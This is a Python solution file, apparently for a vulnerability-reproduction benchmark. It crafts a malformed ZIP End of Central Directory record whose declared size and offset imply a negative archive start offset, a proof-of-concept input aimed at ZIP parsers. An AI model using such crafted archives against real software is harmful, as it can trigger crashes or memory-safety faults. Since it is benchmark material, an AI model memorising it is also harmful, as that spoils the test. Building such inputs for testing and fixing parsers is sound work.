import os
import tarfile
import tempfile
from typing import Iterable, Optional


class Solution:
    def _looks_zip_related(self, src_path: str) -> bool:
        patterns = [
            b"archive start offset",
            b"archive_start_offset",
            b"archiveStartOffset",
            b"central directory",
            b"End of central directory",
            b"end of central directory",
            b"0x06054b50",
            b"06054b50",
            b"PK\\x05\\x06",
            b"PK\x05\x06",
            b"mz_zip",
            b"miniz",
            b"zip64",
        ]

        def scan_bytes(data: bytes) -> bool:
            dl = data.lower()
            for p in patterns:
                if p.lower() in dl:
                    return True
            return False

        def scan_dir(d: str) -> bool:
            max_files = 400
            seen = 0
            for root, _, files in os.walk(d):
                for fn in files:
                    if seen >= max_files:
                        return False
                    seen += 1
                    path = os.path.join(root, fn)
                    try:
                        st = os.stat(path)
                        if not os.path.isfile(path) or st.st_size <= 0:
                            continue
                        if st.st_size > 2_000_000:
                            continue
                        with open(path, "rb") as f:
                            data = f.read(200_000)
                        if scan_bytes(data):
                            return True
                    except Exception:
                        continue
            return False

        if os.path.isdir(src_path):
            return scan_dir(src_path)

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = [m for m in tf.getmembers() if m.isreg()]
                members.sort(key=lambda m: (0 if ("fuzz" in m.name.lower() or "zip" in m.name.lower() or "archive" in m.name.lower()) else 1, m.size))
                for m in members[:600]:
                    try:
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read(200_000)
                        if scan_bytes(data):
                            return True
                    except Exception:
                        continue
        except Exception:
            pass

        return False

    def _build_zip_negative_archive_start_poc(self) -> bytes:
        sig = b"PK\x05\x06"
        disk = (0).to_bytes(2, "little")
        cd_disk = (0).to_bytes(2, "little")
        entries_disk = (1).to_bytes(2, "little")
        entries_total = (1).to_bytes(2, "little")
        cd_size = (46).to_bytes(4, "little")
        cd_ofs = (0).to_bytes(4, "little")
        comment_len = (0).to_bytes(2, "little")
        eocd = sig + disk + cd_disk + entries_disk + entries_total + cd_size + cd_ofs + comment_len
        return b"\x00" * 24 + eocd

    def solve(self, src_path: str) -> bytes:
        # Heuristic detection (best-effort); return PoC regardless.
        _ = self._looks_zip_related(src_path)
        return self._build_zip_negative_archive_start_poc()